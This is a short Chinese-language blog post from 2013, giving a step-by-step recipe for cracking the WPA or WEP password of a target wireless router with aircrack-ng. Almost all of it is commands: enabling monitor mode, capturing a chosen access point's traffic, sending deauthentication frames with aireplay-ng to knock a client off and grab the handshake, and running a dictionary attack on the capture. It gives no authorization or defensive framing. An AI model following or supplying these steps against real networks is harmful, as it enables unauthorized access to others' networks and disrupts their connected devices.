---
layout: post
title:  "破解无线路由密码"
date:   2013-06-18 16:18:55 +0800
categories: blog
tags:   [linux]
---
##破解WPA密码

##准备网络

    ifconfig
    ifconfig eth0 192.168.0.133 netmask 255.255.255.0
    route add default gw 192.168.0.3
    echo 8.8.8.8 >>/etc/resolv.conf
    ping www.163.com

###使用的软件是aircrack-ng:          

    apt-get install aircrack-ng

###过程

    iwconfig
    airmon-ng start wlan0
    airodump-ng mon0   查看网络中的无线AP信息
    airodump-ng mon0 -w ddd -c 11 --bssid 00:1E:88:88:88:88（目标AP的MAC）
           注：如果是WEP加密，抓5000-25000个包，而且不用下面的命令
    aireplay-ng -0 10 -a 00:1E:2A:3D:4C:88 -c BC:77:37:D9:87:C6 mon0  （抓握手包）
           注：破解WPA需要该步
    aircrack-ng -w d.txt ddd*.cap
           注：关键是字典文件，上帝保佑了。。。。。。。。。
               WEP加密：aircrack-ng -z -b 00:1E:88:88:88:88 dddd*.cap


参考：             
[http://linux.cn/thread/10864/1/1/](http://linux.cn/thread/10864/1/1/){:target="_blank"}            
[http://www.backtrack-linux.org/](http://www.backtrack-linux.org/){:target="_blank"}            
[http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists](http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists){:target="_blank"}